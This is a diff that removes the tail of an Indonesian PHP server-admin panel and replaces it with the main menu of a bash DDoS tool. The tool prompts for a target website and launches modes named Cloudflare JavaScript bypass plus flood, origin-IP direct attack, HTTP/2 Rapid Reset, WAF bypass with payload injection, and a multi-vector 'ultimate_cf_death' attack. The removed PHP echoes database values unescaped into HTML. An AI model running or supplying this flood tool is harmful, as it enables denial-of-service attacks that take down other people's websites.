-                                <th>Status</th>
-                                <th>Dibuat</th>
-                                <?php if (isAdminUtama()): ?>
-                                    <th>Aksi</th>
-                                <?php endif; ?>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <?php
-                            $users = $pdo->query("SELECT * FROM users ORDER BY id DESC");
-                            while($user = $users->fetch()):
-                            ?>
-                            <tr>
-                                <td><?php echo $user['id']; ?></td>
-                                <td>
-                                    <?php echo $user['username']; ?>
-                                    <?php if ($user['id'] == 1): ?>
-                                        <span class="badge badge-danger">Admin Utama</span>
-                                    <?php elseif ($user['role'] == 'admin'): ?>
-                                        <span class="badge badge-warning">Admin</span>
-                                    <?php endif; ?>
-                                </td>
-                                <td><?php echo ucfirst($user['role']); ?></td>
-                                <td><span class="status status-active">Active</span></td>
-                                <td><?php echo date('d/m/Y', strtotime($user['created_at'])); ?></td>
-                                <?php if (isAdminUtama()): ?>
-                                    <td>
-                                        <?php if ($user['id'] != 1): ?>
-                                            <a href="?page=users&hapus_user=<?php echo $user['id']; ?>" class="btn btn-danger btn-small" onclick="return confirm('Hapus user?')">Hapus</a>
-                                        <?php else: ?>
-                                            <span style="color: #999;">-</span>
-                                        <?php endif; ?>
-                                    </td>
-                                <?php endif; ?>
-                            </tr>
-                            <?php endwhile; ?>
-                        </tbody>
-                    </table>
-                </div>
-            <?php endif; ?>
-            
-            <!-- Halaman Servers -->
-            <?php if ($page == 'servers'): ?>
-                <div class="card">
-                    <div class="card-header">
-                        <h2>🖥️ Manajemen Servers</h2>
-                        <button class="btn btn-success" onclick="openModal('modalServer')">+ Tambah Server</button>
-                    </div>
-                    
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>ID</th>
-                                <th>Nama Server</th>
-                                <th>IP Address</th>
-                                <th>Status</th>
-                                <th>Dibuat</th>
-                                <th>Aksi</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <?php
-                            $servers = $pdo->query("SELECT * FROM servers ORDER BY id DESC");
-                            while($server = $servers->fetch()):
-                            ?>
-                            <tr>
-                                <td><?php echo $server['id']; ?></td>
-                                <td><?php echo $server['name']; ?></td>
-                                <td><?php echo $server['ip_address']; ?></td>
-                                <td>
-                                    <span class="status status-<?php echo $server['status']; ?>">
-                                        <?php echo ucfirst($server['status']); ?>
-                                    </span>
-                                </td>
-                                <td><?php echo date('d/m/Y', strtotime($server['created_at'])); ?></td>
-                                <td>
-                                    <button class="btn btn-warning btn-small" onclick="editServer(<?php echo $server['id']; ?>, '<?php echo $server['name']; ?>', '<?php echo $server['ip_address']; ?>', '<?php echo $server['status']; ?>')">Edit</button>
-                                    <a href="?page=servers&hapus_server=<?php echo $server['id']; ?>" class="btn btn-danger btn-small" onclick="return confirm('Hapus server?')">Hapus</a>
-                                </td>
-                            </tr>
-                            <?php endwhile; ?>
-                        </tbody>
-                    </table>
-                </div>
-            <?php endif; ?>
-            
-            <!-- Halaman All Menu (khusus admin utama) -->
-            <?php if ($page == 'all' && isAdminUtama()): ?>
-                <div class="card">
-                    <div class="card-header">
-                        <h2>📋 Semua Menu Administrasi</h2>
-                    </div>
-                    
-                    <h3>Basic Administration</h3>
-                    <div class="menu-grid">
-                        <div class="menu-item">
-                            <h4>📊 Overview</h4>
-                            <p>Statistik sistem</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('Overview - Admin Utama')">View</button>
-                        </div>
-                        <div class="menu-item">
-                            <h4>⚙️ Settings</h4>
-                            <p>Pengaturan sistem</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('Settings - Admin Utama')">View</button>
-                        </div>
-                        <div class="menu-item">
-                            <h4>🔑 API</h4>
-                            <p>API Access</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('API - Admin Utama')">View</button>
-                        </div>
-                    </div>
-                    
-                    <h3>Management</h3>
-                    <div class="menu-grid">
-                        <div class="menu-item">
-                            <h4>🗄️ Databases</h4>
-                            <p>Database</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('Databases - Admin Utama')">View</button>
-                        </div>
-                        <div class="menu-item">
-                            <h4>📍 Locations</h4>
-                            <p>Lokasi</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('Locations - Admin Utama')">View</button>
-                        </div>
-                        <div class="menu-item">
-                            <h4>🌐 Nodes</h4>
-                            <p>Nodes</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('Nodes - Admin Utama')">View</button>
-                        </div>
-                    </div>
-                    
-                    <h3>Service Management</h3>
-                    <div class="menu-grid">
-                        <div class="menu-item">
-                            <h4>💾 Mounts</h4>
-                            <p>Mounts</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('Mounts - Admin Utama')">View</button>
-                        </div>
-                        <div class="menu-item">
-                            <h4>🏠 Nests</h4>
-                            <p>Nests</p>
-                            <button class="btn btn-primary btn-small" onclick="alert('Nests - Admin Utama')">View</button>
-                        </div>
-                    </div>
-                </div>
-            <?php endif; ?>
-        </div>
-        
-        <!-- Modal Tambah User (hanya admin utama) -->
-        <?php if (isAdminUtama()): ?>
-        <div id="modalUser" class="modal">
-            <div class="modal-content">
-                <h3>Tambah User Baru</h3>
-                <form method="post">
-                    <div class="form-group">
-                        <label>Username</label>
-                        <input type="text" name="username" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Password</label>
-                        <input type="password" name="password" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Role</label>
-                        <select name="role">
-                            <option value="user">User</option>
-                            <option value="admin">Admin</option>
-                        </select>
-                    </div>
-                    <div class="modal-buttons">
-                        <button type="button" class="btn btn-secondary" onclick="closeModal('modalUser')">Batal</button>
-                        <button type="submit" name="tambah_user" class="btn btn-primary">Simpan</button>
-                    </div>
-                </form>
-            </div>
-        </div>
-        <?php endif; ?>
-        
-        <!-- Modal Tambah Server -->
-        <div id="modalServer" class="modal">
-            <div class="modal-content">
-                <h3>Tambah Server Baru</h3>
-                <form method="post">
-                    <div class="form-group">
-                        <label>Nama Server</label>
-                        <input type="text" name="name" required>
-                    </div>
-                    <div class="form-group">
-                        <label>IP Address</label>
-                        <input type="text" name="ip_address">
-                    </div>
-                    <div class="modal-buttons">
-                        <button type="button" class="btn btn-secondary" onclick="closeModal('modalServer')">Batal</button>
-                        <button type="submit" name="tambah_server" class="btn btn-primary">Simpan</button>
-                    </div>
-                </form>
-            </div>
-        </div>
-        
-        <!-- Modal Edit Server -->
-        <div id="modalEditServer" class="modal">
-            <div class="modal-content">
-                <h3>Edit Server</h3>
-                <form method="post">
-                    <input type="hidden" name="id" id="edit_id">
-                    <div class="form-group">
-                        <label>Nama Server</label>
-                        <input type="text" name="name" id="edit_name" required>
-                    </div>
-                    <div class="form-group">
-                        <label>IP Address</label>
-                        <input type="text" name="ip_address" id="edit_ip">
-                    </div>
-                    <div class="form-group">
-                        <label>Status</label>
-                        <select name="status" id="edit_status">
-                            <option value="active">Active</option>
-                            <option value="inactive">Inactive</option>
-                        </select>
-                    </div>
-                    <div class="modal-buttons">
-                        <button type="button" class="btn btn-secondary" onclick="closeModal('modalEditServer')">Batal</button>
-                        <button type="submit" name="edit_server" class="btn btn-primary">Update</button>
-                    </div>
-                </form>
-            </div>
-        </div>
-        
-        <script>
-            function openModal(id) {
-                document.getElementById(id).classList.add('active');
-            }
-            
-            function closeModal(id) {
-                document.getElementById(id).classList.remove('active');
-            }
-            
-            function editServer(id, name, ip, status) {
-                document.getElementById('edit_id').value = id;
-                document.getElementById('edit_name').value = name;
-                document.getElementById('edit_ip').value = ip;
-                document.getElementById('edit_status').value = status;
-                openModal('modalEditServer');
-            }
-            
-            window.onclick = function(e) {
-                if (e.target.classList.contains('modal')) {
-                    e.target.classList.remove('active');
-                }
-            }
-        </script>
-    <?php endif; ?>
-</body>
-</html>
+
+main() {
+    banner
+    install_heavy_deps
+    
+    echo -e "${CYAN}════════════════════════════════════════════${NC}"
+    echo -e "${GREEN}Masukkan target website (dengan http/https):${NC} "
+    read target
+    
+    echo ""
+    echo -e "${GREEN}Pilih mode serangan:${NC}"
+    echo "1. CF JavaScript Bypass + Flood"
+    echo "2. Origin IP Finder + Direct Attack"
+    echo "3. HTTP/2 Rapid Reset"
+    echo "4. WAF Bypass + Payload Injection"
+    echo "5. Browser Emulation Attack"
+    echo "6. MULTI-VECTOR BYPASS (REKOMENDASI)"
+    echo -n "Pilih [1-6]: "
+    read mode
+    
+    case $mode in
+        1)
+            bypass_cf_javascript "$target"
+            http_flood "$target" 1000 3600
+            ;;
+        2)
+            find_real_ip "$target"
+            if [ -f /tmp/confirmed_ips.txt ]; then
+                domain=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)
+                while read ip; do
+                    cf_origin_bypass $ip $domain
+                done < /tmp/confirmed_ips.txt
+            fi
+            ;;
+        3)
+            http2_flood "$target"
+            ;;
+        4)
+            bypass_cf_waf "$target"
+            ;;
+        5)
+            browser_emulation "$target"
+            ;;
+        6)
+            ultimate_cf_death "$target"
+            monitor_cf_bypass "$target" &
+            ;;
+    esac
+    
+    echo -e "${RED}[!] Attack running - Tekan CTRL+C untuk stop${NC}"
+    wait
+}
+
+# Run
+main
